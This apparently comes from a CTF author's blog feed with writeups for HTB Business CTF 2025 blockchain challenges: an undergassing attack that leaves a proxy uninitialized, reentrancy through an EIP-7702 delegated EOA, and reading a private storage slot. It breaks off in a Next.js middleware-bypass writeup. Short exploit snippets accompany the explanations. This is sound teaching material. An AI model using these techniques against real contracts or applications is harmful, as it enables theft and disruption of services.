‚Äúundergassing‚Äù attack on EVM. Challenge Scenario # Volnaya‚Äôs original VNCKv1 was compromised in the GreatBl@ck0Ut attack. They rolled out VCNKv2 as a hardened replacement, adding:\nA failsafe that only triggers emergency mode if \u0026gt;50% of gateways are deadlocked A built-in factory (VCNKv2) that only deploys audited, UUPS-compatible gateways A ControlUnit that tracks gateway health and enforces aggregated capacity Your mission is to find a way to trick the kernel into CU_STATUS_EMERGENCY mode, despite these protections.\nAnalyzing the Source Code # Setup.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.29; import { VCNKv2 } from \u0026#34;./VCNKv2.sol\u0026#34;; contract Setup { VCNKv2 public TARGET; event DeployedTarget(address at); constructor(uint8 _nGateways) { TARGET = new VCNKv2(_nGateways); emit DeployedTarget(address(TARGET)); } function isSolved() public view returns (bool) { uint8 CU_STATUS_EMERGENCY = 3; (uint8 status, , , , ) = TARGET.controlUnit(); return status == CU_STATUS_EMERGENCY; } } The target contract is deployed with _nGateways passed at deployment by deployer account, we can check the exact number by looking into the constructor args passed to the Setup contract deployed at the zero block (cast block 0 to inspect).\nTo solve the challenge, as the V1 challenge required, we need to trigger the CU_STATUS_EMERGENCY status.\nVCNKv2.sol, VCNKv2CompatibleProxy.sol and VCNKv2CompatibleReceiver.sol # The VCNKv2 contract appears to be almost the same as the previous VNCK challenge contract, just with some more robustness and features. Again, the contract is deployed on the \u0026ldquo;prague\u0026rdquo; hardfork, and the reentrancy check modifier circuitBreaker remained the same. However, the previously vulnerable function, requestPowerDelivery, better follows the CEI pattern on critical storage variables.\nfunction requestPowerDelivery(uint256 _amount, uint8 _gatewayID) external circuitBreaker failSafeMonitor { Gateway storage gateway = controlUnit.registeredGateways[_gatewayID]; require(controlUnit.status == CU_STATUS_IDLE, \u0026#34;[VCNK] Control unit is not in a valid state for power delivery.\u0026#34;); require(gateway.status == GATEWAY_STATUS_IDLE, \u0026#34;[VCNK] Gateway is not in a valid state for power delivery.\u0026#34;); require(_amount \u0026gt; 0, \u0026#34;[VCNK] Requested power must be greater than 0.\u0026#34;); require(_amount \u0026lt;= gateway.availableQuota, \u0026#34;[VCNK] Insufficient quota.\u0026#34;); emit PowerDeliveryRequest(_gatewayID, _amount); controlUnit.status = CU_STATUS_DELIVERING; controlUnit.currentCapacity -= _amount; gateway.status = GATEWAY_STATUS_ACTIVE; gateway.totalUsage += _amount; bool status = VCNKv2CompatibleReceiver(gateway.addr).deliverEnergy(_amount); require(status, \u0026#34;[VCNK] Power delivery failed.\u0026#34;); controlUnit.currentCapacity = MAX_CAPACITY; gateway.status = GATEWAY_STATUS_IDLE; emit PowerDeliverySuccess(_gatewayID, _amount); } It\u0026rsquo;s still updating controlUnit.currentCapacity after the external interaction, but critically, now the gateway usage tracking is moved up before the external call, making the reentrancy useless. Also, a require(controlUnit.status == CU_STATUS_IDLE) check is added making reentrancy completely unexploitable.\nMoreover, reading the updated registerGateway function, now users cannot arbitrary register their own gateways contracts but instead the contract will deploy its own gateway contracts via the _deployGateway internal function.\nfunction _deployGateway(uint8 id) internal { VCNKv2CompatibleReceiver impl = new VCNKv2CompatibleReceiver(); VCNKv2CompatibleProxy proxy = new VCNKv2CompatibleProxy( address(impl), \u0026#34;\u0026#34; ); controlUnit.registeredGateways[id] = Gateway( address(proxy), GATEWAY_STATUS_IDLE, 0, 0 ); controlUnit.latestRegisteredGatewayID++; VCNKv2CompatibleReceiver(address(proxy)).initialize(); } The new gateway contracts are upgradable contracts, meaning that the gateway actually becomes two contracts that follows the proxy-implementation pattern: one is the proxy contract, which its only job is to hold the \u0026ldquo;memory\u0026rdquo; of the \u0026ldquo;implementation contract\u0026rdquo;. The other one is implementation contract is where the actual contract logic happen (so called \u0026ldquo;implementation\u0026rdquo;), and this is the actual \u0026ldquo;upgradable\u0026rdquo; contract. Since the proxy contract also stores the address of the implementation contract, an authorized user can just change this storage slot to point to a new implementation contract, effectively upgrading the contract logic that passes through the proxy.\nHow is that actually done though? Low-level speaking, the proxy contract is basically a glorified delegatecall, and since this peculiar opcode allows to delegate the execution of a function to another contract while keeping the same storage context, the delegated contract will only change the storage of the proxy contract.\nA basic understanding of proxy patterns is required to solve this challenge, so if you are not familiar with it, better explanations can be found in the RareSkills blog posts or in the OpenZeppelin documentation.\nUsually, such patterns, as delicate as they can be, they gets standardized and then OpenZeppelin libraries provide a robust implementation of them. In our scenario the VCNKv2CompatibleReceiver does in fact import OZ\u0026rsquo;s Initializable and UUPSUpgradeable contracts, but the VCNKv2CompatibleProxy doesn\u0026rsquo;t.\nSince the implementation contracts also holds both the initializing and the upgrade logic, it is said to be an UUPS upgradeable contract. Critically, in such patterns, as well for the UUPS ones, the initialization doesn\u0026rsquo;t happen in the constructor, but rather in a separate initializer function. While this can be a safe practice if done as intended, this 2-step pattern inevitably opens to more attack vectors, and points of failure. This challenges does in fact demonstrate an attack scenario when this can be exploited.\nShifting the focus back to the custom proxy implementation, VCNKv2CompatibleProxy, and comparing to a basic OpenZeppelin proxy contract implementation, we won\u0026rsquo;t see much of a difference at first glance. However, one critical check is missing: the return data of the delegatecall is not checked, meaning any failing proxied call won\u0026rsquo;t revert the transaction, potentially leaving to inconsistent states.\nGreat! this sound exploitable, isn\u0026rsquo;t it? Let\u0026rsquo;s imagine the initialize() function called by the VCNKv2 factory fails when deploying a new Gateway contract\u0026hellip; The transaction will not be reverted, leaving the deployed implementation contract VCNKv2CompatibleReceiver uninitialized! Moreover, the initialize() doesn\u0026rsquo;t have a whitelist for who can initialize the contract, but instead it assumes that the calles is the Factory contract itself and store its address in the _KERNEL_SLOT storage slot, which by the way has high privileges as it can authorize upgrades and therefore upgrade the implementation contract to an arbitrary one. For the sake of the challenge, it is enough to just leave the _KERNEL_SLOT empty, as the healthcheck() function will return false if the _kernel() is address(0), marking the gateway be treates as in a DEADLOCK state. If at least 51% of the registered gateways are in a DEADLOCK state, the infrastructureSanityCheck() function will trigger the CU_STATUS_EMERGENCY status needed to solve the challenge.\nThe goal now becomes clear: call registerGateway and make the deployment of the new gateway contract succeed, but make the initialization somehow fail. Doing this for enough gateways in a 51%-like attack and we win.\nThe \u0026ldquo;undergassing\u0026rdquo; attack # When I started writing the challenge, I wanted to have a \u0026ldquo;factory-\u0026gt;proxy-\u0026gt;uninitialized\u0026rdquo; type of attack scenario, but I still didn\u0026rsquo;t have a clear idea of how possibly achieve such scenario without making also the contract deployment fail. Moreover, I wanted to be as much as realistic as possible, and therefore having a clean logic other than the missing return value check. I started questioning myself if this would be even possible, since the attacker wouldn\u0026rsquo;t control none of the inputs, execution flow, or environment\u0026hellip; but here is when I made the realization that an attacker triggering the contract deployment via the registerGateway() function actually has \u0026ldquo;input control\u0026rdquo; over a critical parameter that is then passed around during all the execution flow: the gas limit!.\nI started looking in the wild for such attack scenario, but I didn\u0026rsquo;t found many references and thought it would be a cool idea to implement for the challenge and potentially bring more awareness on this attack vector.\nIn the context of this challenge, given the previous analysis, the idea is to pass a gas limit value such that the VCNKv2CompatibleProxy contract is deployed successfully, but the subsequent initialize() on VCNKv2CompatibleReceiver will internally run out of gas (OOG) and fail silently, leaving the proxy in an uninitialized state.\nThe attack steps are as follows:\nThe attacker calls registerGateway() function with purposefully accurate low gas limit. The VCNKv2 factory deploys a new VCNKv2CompatibleProxy contract, the transaction shouldn\u0026rsquo;t go OOG here. The factory then calls VCNKv2CompatibleReceiver(address(proxy)).initialize(), the proxy forwards the call to the VCNKv2CompatibleReceiver contract via delegatecall with the remaining gas limit while retaining a 1/64 portion of it because of the 63/64 gas rule for external calls in EVM. The initialize() function is called with so little gas that it runs out of gas while executing. The delegatecall receives an OOG exception in the r return value, but it\u0026rsquo;s not checked. The proxy contract does not revert and returns normally because of the small portion of gas left saved before the call. The factory has registered the new gateway address but left it uninitialized. Repeat from step 1) for enough gateways to reach the 51% threshold of deadlocked gateways. Exploitation # Well\u0026hellip; this is funny. On paper, the attack shouldn\u0026rsquo;t be too much of a trouble to implement, just a few tries with binary search on different gas limits until we find the sweet spot. The fact is that Foundry for example does two-step simulations in scripts before broadcasting the transaction, and if it fails it won\u0026rsquo;t be broadcasted at all. The funny part starts here: since the simulations will never be 100% accurate, and given that our attack can be sensitive to even the smallest amount unit of gas, it may happen that the simulation will succeed/fail on some calls but that won\u0026rsquo;t actually happen on the broadcasted transaction.\nIn fact, my exploit never fails on any call on the simulation\u0026hellip;\nüé£ but once it gets broadcasted it will actually fail on initialize() and make us win.\nThe exploit is essentially just the following:\nfor (uint8 i = 0; i \u0026lt; 5; i++) { target.registerGateway{ value: 20 ether, gas: 1_150_500 }(); console2.log(\u0026#34;registered gateway\u0026#34;, i); } target.infrastructureSanityCheck(); target.infrastructureSanityCheck(); ( uint8 status, , , , ) = target.controlUnit(); console2.log(\u0026#34;Control Unit status:\u0026#34;, status); And upon reading target.controlUnit() we will see the status field equal to 3 (Emergency Mode), satisfying the challenge solve requirements.\nSee the full exploitation script here.\nHTB{g4sL1ght1nG_th3_VCNK_its_GreatBl@ck0Ut_4ll_ov3r_ag4iN}\n","date":"22 May 2025","externalUrl":null,"permalink":"/posts/htb-businessctf-2025/blockout/","section":"Blog","summary":"Author writeup for the \u0026ldquo;Blockout\u0026rdquo; medium blockchain challenge from HTB Business CTF 2025.","title":"HTB Business CTF 2025 - Blockout [Author Writeup]","type":"posts"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/proxy-pattern/","section":"Tags","summary":"","title":"Proxy-Pattern","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/undergassing/","section":"Tags","summary":"","title":"Undergassing","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/uups/","section":"Tags","summary":"","title":"UUPS","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/eip-7702/","section":"Tags","summary":"","title":"EIP-7702","type":"tags"},{"content":" Spectral # 22nd May 2025\nPrepared By: perrythepwner\nChallenge Author(s): perrythepwner\nDifficulty: Easy\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-BusinessCTF-2025/Spectral TLDR # The VCNK.sol contract acts as a power plant, delivering on-demand power to arbitrary contracts that implement the vcnkCompatibleReceiver interface. The VCNK contract is missing the Checks-Effects-Interactions (CEI) pattern in requestPowerDelivery, and its reentrancy guard (require(msg.sender == tx.origin)) is obsolete after the EVM Pectra upgrade (EIP-3074 / EIP-7702). An attacker can therefore bypass the guard via a delegated EOA, recursively call requestPowerDelivery in their deliverEnergy callback, drive the control unit\u0026rsquo;s capacity below the fail-safe threshold, and trigger Emergency Mode.\nDescription # A new nuclear power plant called \u0026ldquo;VCNK\u0026rdquo; has been built in Volnaya, and the dominance of the energy lobby is now stronger than ever. You have been assigned to Operation \u0026ldquo;Blockout\u0026rdquo; and your mission is to find a way to disrupt the power plant to slow them down. See you in the dark!\nSkills Required # Basic understanding of Solidity and smart contracts Interaction with smart contracts Basic understanding of reentrancy attacks Skills Learned # Reentrancy attacks after Pectra upgrade and EIP-7702 Analyzing the Source Code # Setup.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.29; import { VCNK } from \u0026#34;./VCNK.sol\u0026#34;; contract Setup { VCNK public TARGET; event DeployedTarget(address at); constructor() { TARGET = new VCNK(); emit DeployedTarget(address(TARGET)); } function isSolved() public view returns (bool) { uint8 CU_STATUS_EMERGENCY = 3; (uint8 status, , , ) = TARGET.controlUnit(); return status == CU_STATUS_EMERGENCY; } } The Setup.sol contract, as common for blockchain challenges, simply instantiates a fresh VCNK contract and implements the isSolved function used by the server to check if the challenge\u0026rsquo;s solve criteria are met. The requirements are that the ControlUnit status of the VCNK contract is set to CU_STATUS_EMERGENCY.\nVCNK.sol # Prague/Electra (Pectra) hardfork # First of all, an important detail is that in the foundry.toml file, the VCNK contract is set to be deployed with the \u0026ldquo;Prague\u0026rdquo; hardfork.\n[profile.default] src = \u0026#34;src\u0026#34; out = \u0026#34;out\u0026#34; libs = [\u0026#34;lib\u0026#34;] evm_version = \u0026#34;prague\u0026#34; \u0026ldquo;Prague\u0026rdquo; and \u0026ldquo;Electra\u0026rdquo; were supposed to be two different upgrades for Ethereum, but they were merged into one upgrade called \u0026ldquo;Pectra\u0026rdquo;. The Pectra upgrade includes updates to both the execution layer and the consensus layer of the Ethereum network. One of the most relevant changes in this upgrade is the implementation of EIP-7702, which allows user accounts (EOA) to be extended with smart contract code, effectively allowing them to act as smart contracts and therefore make use of some the Account Abstraction concepts. For example:\nTransaction Batching: EOAs can now batch multiple operations into a single transaction, reducing gas fees and improving efficiency. Gas sponsorship (meta-txs): Third parties (dApps, relayers, or service providers) can pay gas on behalf of end users. Account X signs an authorization so that account Y\u0026rsquo;s EOA can execute code and have its gas fees covered without Y holding ETH. Programmable Wallets: EOAs can now have programmable logic, allowing for more complex interactions, such as multi-signature wallets, time-locked accounts, and more. More details about the Pectra upgrade: https://ethereum.org/en/roadmap/pectra/\nAllowing EOAs to execute smart contract code means that the msg.sender of a transaction can now be the EOA itself, which has never been possible before. Therefore, the Pectra upgrade broke some past assumptions used for example for security measures, such as reentrancy guards of the form require(msg.sender == tx.origin). While that pattern was a valid (and cheap, because storing lock-like variables in global storage is expensive) reentrancy guard before the Pectra upgrade, it is now useless. This challenge focuses on this aspect of the Pectra upgrade, and how it can be concretely exploited.\nCore Logic # Regarding the VCNK contract, the code mainly revolves around a ControlUnit struct stored in contract state, along with a per-address Gateway struct mapping. The ControlUnit holds the kernel status and state:\nControlUnit.currentCapacity: holds the current power capacity of the plant (how much power can be delivered). After each successful power delivery, this value is reset to MAX_CAPACITY. If that value drops below FAILSAFE_THRESHOLD, the failSafeMonitor modifier sets the ControlUnit status to Emergency Mode. ControlUnit.status: indicates the current status of the control unit (idle, delivering, emergency). ControlUnit.allocatedAllowance: the total amount of power that the overall gateways can request. The contract logic requires users to register via the registerGateway and pay a 20 ETH fee, in order to register an arbitrary Gateway contract address into the gateways mapping. After that, they can top up their individual quotas (up to 10 ETH) via requestQuotaIncrease.\nThe heart of the protocol is requestPowerDelivery. This function first checks that the caller\u0026rsquo;s gateway is in the idle state and that the requested amount does not exceed its current quota. It then emits a delivery request event, sets the control unit status to delivering, and subtracts the desired amount from controlUnit.currentCapacity. Only after these steps does it perform the external call to vcnkCompatibleReceiver(_receiver).deliverEnergy(_amount). As already mentioned, the vcnkCompatibleReceiver contract can be arbitrary, meaning we have execution flow control. Only after the external deliverEnergy callback execution, the gateway.totalUsage is updated with the requested amount, and the controlUnit.currentCapacity is reset back to MAX_CAPACITY. This is a common missing Checks-Effects-Interactions (CEI) pattern, potentially leading to reentrancy vulnerabilities.\nAs already mentioned, the circuitBreaker modifier, supposed to break reentrancy attempts, is basically useless after the Pectra upgrade, and because the external interaction happens before the updates to the gateway\u0026rsquo;s usage and before re-setting state, an attacker can reenter requestPowerDelivery during the deliverEnergy callback to repeatedly drain capacity and trigger Emergency Mode on the CU.\nExploitation # While the main attack vector is a textbook reentrancy exploit, the EIP-7702 EOA-\u0026gt;Contract delegation might not be so straightforward, especially in these early stages of the upgrade. Moreover, at the time of writing, the Foundry\u0026rsquo;s signDelegation cheatcode seems broken (I still provided the wannabe foundry exploit here because I lost time writing it before realizing foundry was just broken :/).\nThe snakecharmers blog post does a great job explaining EIP-7702 at both a high level and a low level, and also how to concretely implement it using web3.py, which is also used for the solve script here.\nThe attack flow is as follows:\nDeploy a malicious Exploit.sol that implements the vcnkCompatibleReceiver interface In its deliverEnergy(uint256 amount) callback, check the plant\u0026rsquo;s remaining capacity and recursively call requestPowerDelivery(amount, attackerEOA) again until the ControlUnit capacity is below the FAILSAFE_THRESHOLD Sign a delegation authorization (type 4 TX) against your EOA using sign_authorization web3.py method Register the malicious contract as a gateway Call requestQuotaIncrease function to increase the quota of the malicious gateway to 10 ETH Call requestPowerDelivery with the maximum amount (10 ETH) to trigger the reentrancy exploit The full exploitation script is available here.\nHTB{Pectra_UpGr4d3_c4uSed_4_sp3cTraL_bL@cK0Ut_1n_V0LnaYa}\n","date":"22 May 2025","externalUrl":null,"permalink":"/posts/htb-businessctf-2025/spectral/","section":"Blog","summary":"Author writeup for the \u0026ldquo;Spectral\u0026rdquo; easy blockchain challenge from HTB Business CTF 2025.","title":"HTB Business CTF 2025 - Spectral [Author Writeup]","type":"posts"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/pectra/","section":"Tags","summary":"","title":"Pectra","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/reentrancy/","section":"Tags","summary":"","title":"Reentrancy","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/tx.origin/","section":"Tags","summary":"","title":"Tx.origin","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/evm/","section":"Tags","summary":"","title":"EVM","type":"tags"},{"content":" Enlistment # 10th May 2025 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Very-Easy\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-BusinessCTF-2025/Enlistment TLDR # The challenge aims to be a setup challenge for blockchain challenges. To solve it a player must read the privateKey private variable via low level storage access and compute the expected _proofHash used by the target contract.\nDescription # Task Force Phoenix is mobilizing to counter the growing cyber threat of Operation Blackout. Applications are now open for enlistment in the Blockchain Security Unit. I\u0026rsquo;ve heard that you are a good one Agent P. huh? I don\u0026rsquo;t like to talk much but to me it looks like one of those once-in-a-lifetime opportunities\u0026hellip;\nSkills Required # Basic understanding of Solidity and smart contracts Skills Learned # Smart contracts interaction Solidity lang basics: private, immutable, primitive types, keccak256 EVM storage basics Challenge Scenario # We\u0026rsquo;re given some attachments and two ports to interact to.\nBy simply interacting to the given ip:port pairs, we understand that:\n- one is a TCP connection\n- the other is an HTTP webserver that replies with \u0026ldquo;rpc is running!\u0026rdquo;\nConnecting to the TCP port using netcat we receive connection information needed to interact with the challenge environment. Selecting the 1 - Get connection informations option we will get the player private key, player address, target contract address and finally a \u0026ldquo;setup\u0026rdquo; contract address. The HTTP port is a JSON-RPC endpoint that allows us to interact with the challenge local blockchain instance.\nAnalyzing the Source Code # Setup.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.29; import { Enlistment } from \u0026#34;./Enlistment.sol\u0026#34;; contract Setup { Enlistment public TARGET; address public player; event DeployedTarget(address at); constructor(address _player, bytes32 _key) { TARGET = new Enlistment(_key); player = _player; emit DeployedTarget(address(TARGET)); } function isSolved() public view returns (bool) { return TARGET.enlisted(player); } } Having a Setup.sol contract in blockchain challenges is a common pattern. This smart contract is usually needed for:\n1) deploying the target contract (the actual challenge)\n2) providing a checker as an external function to verify solve requirements are met\nIn this case, the Setup contract deploys the Enlistment contract and provides the isSolved() function to check if the player is \u0026ldquo;enlisted\u0026rdquo;. In that case, the player address is just the same address passed earlier in the TCP connection when the instance was started.\nEnlistment.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.29; contract Enlistment { bytes16 public publicKey; bytes16 private privateKey; mapping(address =\u0026gt; bool) public enlisted; constructor(bytes32 _key) { publicKey = bytes16(_key); privateKey = bytes16(_key \u0026lt;\u0026lt; (16*8)); } function enlist(bytes32 _proofHash) public { bool authorized = _proofHash == keccak256(abi.encodePacked(publicKey, privateKey)); require(authorized, \u0026#34;Invalid proof hash\u0026#34;); enlisted[msg.sender] = true; } } The Enlistment contract is the actual challenge. Even for someone who is not familiar with Solidity, the logic should be pretty straightforward. The constructor is called once on contract initialization and takes a bytes32 key and splits it into two bytes16 variables: publicKey and privateKey. The enlist() function takes a _proofHash as input and checks if it is equal to the keccak256 hash (common hashing function for EVM contracts) of the public and private keys concatenated. If the hash is valid, the player gets enlisted. Some visibility modifiers are used in the contract. The enlist function is public, meaning it can be called by anyone. The publicKey variable is also public, meaning that it can be read by anyone and the Solidity compiler will automatically embed a getter function for it in the final deployed on-chain bytecode. This is also the function called by the setup contract indeed in the isSolved() function. The privateKey variable is private, meaning it can only be accessed from within the contract itself.\nNote that the private modifier doesn\u0026rsquo;t mean the variable cannot be read by external accounts. Even though the naming could be a bit misleading, every smart contract developer should know that everything in the blockchain is public, which by the way it also one of main blockchain features.\nBut, how to actually read it? This time, the compiler won\u0026rsquo;t provide a getter function for it, meaning we need to find another way around to read it. Luckily, in JSON-RPC endpoints (the piece of software that allows a client/user to easily interact with the blockchain), a eth_getStorageAt method exists that allows us to read the raw storage of a contract. The storage is where all the global state of the contract is stored, and it is organized in \u0026ldquo;slots\u0026rdquo; as key-value pairs. Each slot is 32 bytes, and the contract starts storing its variables from slot 0.\nIn that specific case, the publicKey and privateKey variables are both of type bytes16, meaning they can be packed into a single storage slot. This memory layout optimization is done by the Solidity compiler, again, at compile time. This behavior can also be verified using the forge inspect Enlistment storage command on the Enlistment contract, that will output the following:\n‚ûú forge inspect Enlistment storage ‚ï≠------------+--------------------------+------+--------+-------+-------------------------------‚ïÆ | Name | Type | Slot | Offset | Bytes | Contract | +===============================================================================================+ | publicKey | bytes16 | 0 | 0 | 16 | src/Enlistment.sol:Enlistment | |------------+--------------------------+------+--------+-------+-------------------------------| | privateKey | bytes16 | 0 | 16 | 16 | src/Enlistment.sol:Enlistment | |------------+--------------------------+------+--------+-------+-------------------------------| | enlisted | mapping(address =\u0026gt; bool) | 1 | 0 | 32 | src/Enlistment.sol:Enlistment | ‚ï∞------------+--------------------------+------+--------+-------+-------------------------------‚ïØ In fact, both publicKey and privateKey are stored in the same storage slot (slot 0).\nAt this point, once the player gets a grasp on that concepts, it should be straightforward to try to read the storage zero slot, get both publicKey and privateKey from it, compute the keccak256 hash of it and pass it to the enlist() function.\nActually, as the most attentive ones will notice, there is also another way to solve the challenge: since, once again, everything on the blockchain is public, another way to get the needed publicKey and privateKey is to find the transaction initialized by Setup.sol that deployed Enlistment.sol where the arguments to the constructor are also passed, and so the _key parameter needed in order to solve the challenge.\nExploitation # The final solve script can be assembled in many ways. As the embedded documentation in the challenge states, one can even just interact with the JSON-RPC endpoints via raw HTTP requests using for example curl. The standalone cast cli tool provided by the Foundry ctoolset is also just enough to solve this challenge, via the cast storage subcommand to read storage slots, cast keccak to compute the hash and cast send to send the function call to enlist().\nHowever, a more convenient solution (especially for the following challenges) is to write a solve script that uses web3.py library (or any other library like the js respective web3.js library, ethers.js, etc), or by using Foundry cheatcodes. Any similar framework could also work.\nThe official solution for this challenge uses web3.py and can be fully read here. The focus point of the script are the following lines:\nw3 = Web3(Web3.HTTPProvider(RPC_URL)) [...] key = w3.eth.get_storage_at(target_addr, 0) private_key, public_key = (key[:16], key[16:32]) [...] proof_hash = w3.keccak(public_key + private_key) [...] csend(target_addr, \u0026#34;enlist(bytes32)\u0026#34;, proof_hash.hex()) HTB{gg_wp_w3lc0me_t0_th3_t34m}\n","date":"22 May 2025","externalUrl":null,"permalink":"/posts/htb-businessctf-2025/enlistment/","section":"Blog","summary":"Author writeup for the \u0026ldquo;Enlistment\u0026rdquo; very-easy blockchain challenge from HTB Business CTF 2025.","title":"HTB Business CTF 2025 - Enlistment [Author Writeup]","type":"posts"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/private-visibility/","section":"Tags","summary":"","title":"Private-Visibility","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/storage/","section":"Tags","summary":"","title":"Storage","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/warmup/","section":"Tags","summary":"","title":"Warmup","type":"tags"},{"content":" TL;DR # The proxy/app.py server is a simple reverse proxy that start up a NextJS app instance and forwards requests to it. This proxy is vulnerable because it allows setting an environment variable, but with length constraints and without controlling the value. This can be abused to set the NEXT_PRIVATE_TEST_HEADERS env var on the NextJS app and make the CVE-2025-29927 exploit possible again.\nDescription # I heard about some next.js cve issues recently, so I decided to provide next.js on a safe version for anyone!\nIntroduction # Another week goes by, and again NextJS can\u0026rsquo;t go 5 seconds without humiliating itself. Since the public disclosure of CVE-2025-29927, NextJS has caught the attention of many security researchers from all over the world, and in particular from CTF players. When I saw that this weekend too there was a challenge on NextJS I could NOT skip it, I needed a good laugh.\nAt this point I don\u0026rsquo;t know anymore who\u0026rsquo;s the most bullied between NextJS and Bun. It was one of the first challenges I looked into, and after a few hours we got first blood :)\nAt the end of the event, it was the least solved web challenge along with web/musicplayer (which we also solved :p) so here I am writing a writeup for it.\nChallenge Scenario # The challenge setup is pretty simple, there\u0026rsquo;s a proxy/app.py server that acts as instancer and reverse proxy for the NextJS app that can be launched via the /start endpoint. The NextJS app is essentially just a template that hardcodes the flag in the html at /admin/flag, but with the following middleware:\nmiddleware.ts\nimport { NextResponse } from \u0026#39;next/server\u0026#39; import type { NextRequest } from \u0026#39;next/server\u0026#39; // don\u0026#39;t want just anyone getting the flag ‚≠êÔ∏è export function middleware(request: NextRequest) { return NextResponse.redirect(new URL(\u0026#39;/\u0026#39;, request.url)); } export const config = { matcher: \u0026#39;/admin/:path*\u0026#39; } As simple as it gets, the middleware just redirects any request to /admin/* back to the homepage. Or I\u0026rsquo;d say, how it should have been (right nextjs?). Clearly the goal here is to bypass the middleware to get the flag, which instantly made me think of CVE-2025-29927.\nAny route-based bypass could also have worked obviously, it may happen with some matcher misconfigurations for example. Something that could also work is any type of path normalization issue that is then used for an internal rewrite (NextResponse.rewrite()).\nInterestingly enough, while I was fuzzing for interesting env vars, I found the skipMiddlewareUrlNormalize config (tracked by the __NEXT_NO_MIDDLEWARE_URL_NORMALIZE env var at build time), that disables URL normalizations in middleware\u0026hellip; aand why is that interesting? NextJS automatically generates internal JSON endpoints for SSR pages, e.g. /_next/data/\u0026lt;build-id\u0026gt;/admin/flag.json for the /admin/flag endpoint. These endpoints contain only the props needed for hydration or ISR, to avoid sending the full HTML each render. By default, the router rewrites a request like /_next/data/\u0026lt;build-id\u0026gt;/admin/flag.json to /admin/flag before it reaches middleware. Setting skipMiddlewareUrlNormalize disables that rewrite, so the JSON route no longer matches the /admin/:path* matcher and slips past the middleware. The challenge was running a hardcoded version of NextJS 15.2.3, meaning that the CVE-2025-29927 was not directly exploitable anymore.\nFun fact: After CVE-2025-29927 was patched, I decided to take a look on how they implemented the fix. Initially I expected that they had completely revisited the middleware request handling model (because there\u0026rsquo;s no way that\u0026rsquo;s a good design model). Then I remembered that we are talking about NextJS and that in the meantime the vulnerability had gone around the world. It certainly couldn\u0026rsquo;t be a quality patch to say the least.\nIn fact, this was the patch: https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\nThe commit message alone doesn\u0026rsquo;t inspire much confidence, it looks almost like a routine dev fix and not a critical security patch. At that time I decided to take a closer look and so I found myself reading the NextJS source code at 3 AM of a random Sunday.\nIn fact, I quickly realized that the \u0026ldquo;patch\u0026rdquo; wasn\u0026rsquo;t actually a fix, but rather a workaround: x-middleware-subrequest was still allowed from ingress requests, but now an 8-byte cryptographically random middlewareSubrequestId is generated and the header gets dropped if a x-middleware-subrequest-id doesn\u0026rsquo;t match that secret.\nThis means that the vulnerability is still there, but now you need to guess or leak the middlewareSubrequestId in order to exploit it.\nHere\u0026rsquo;s me the next day trolling with @salvatore.abello about that patch: sus nextjs CVE-2025-29927 patch WELL\u0026hellip; guess what happens a few days later?\nhttps://vercel.com/changelog/cve-2025-30218 Researchers found a way to leak the middlewareSubrequestId via external fetch requests in middleware and use it in x-middleware-subrequest to bypass middleware again. So, yeah, I was right and I basically missed out on an easy CVE + bounty üò≠\nAnyway, I definitely learned something these days about NextJS internals, and that was the reason why I solved this challenge, so let\u0026rsquo;s get back to it.\nSurely enough, we didn\u0026rsquo;t have to find another NextJS n-day about middleware bypasses, even though the NextJS version wasn\u0026rsquo;t the latest at the time of the event. Maybe it had something to do with that ugly patch just after 15.2.2. I kept that in mind and started looking into proxy/app.py.\nThis endpoint immediately caught my attention:\n@app.route(\u0026#39;/csrf\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def csrf(): token = request.form.get(\u0026#39;token\u0026#39;, token_hex(16))[:30].strip().encode(\u0026#34;utf-8\u0026#34;) if len(token) \u0026lt; 20: return Response(\u0026#39;Insecure CSRF Token.\u0026#39;, status=500) try: clear_csrf() environ[token.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;)] = CSRF_TOKEN token = int(token, 16) return Response(\u0026#39;Set valid CSRF Token.\u0026#39;, status=200) except ValueError: return Response(\u0026#39;CSRF Token must be hex.\u0026#39;, status=500) The endpoints looks intended to set a CSRF token as env var to pass it later to the NextJS app, but the implementation is pretty bad. What actually happens here is that we can set any env var with a minimum length of 20 chars and a maximum of 30. Furthermore, we don\u0026rsquo;t control its value, since the value is the random hex token CSRF_TOKEN generated by token_hex(16), at the beginning of app.py.\nWhat we can do, however, is set any env var of that length constraint that will be interpreted as on-off switch. Note that it doesn\u0026rsquo;t have to be a valid hex string, because any ValueError will be caught and the env var is set on environ beforehand anyway.\nSince the NextJS app is started using subprocess.run, it inherits the environment variables from the proxy/app.py process. This means any environment variable set via the /csrf endpoint will be propagated to the NextJS app\u0026rsquo;s runtime environment when npm run start (and thus next start) is executed.\nThe NextJS app can be started via the /start endpoint, but here one thing can be problematic:\n@app.route(\u0026#39;/start\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def start(): clear_csrf() environ[\u0026#39;CSRF_TOKEN\u0026#39;] = CSRF_TOKEN global STARTED if STARTED: return Response(\u0026#34;Start already initiated\u0026#34;, status=428) with start_lock: if STARTED: return Response(\u0026#34;Start already initiated\u0026#34;, status=428) STARTED = True try: run([\u0026#39;sleep\u0026#39;, \u0026#39;3\u0026#39;], check=False) # make sure lock is aquired print(f\u0026#34;Starting Next.js instance with 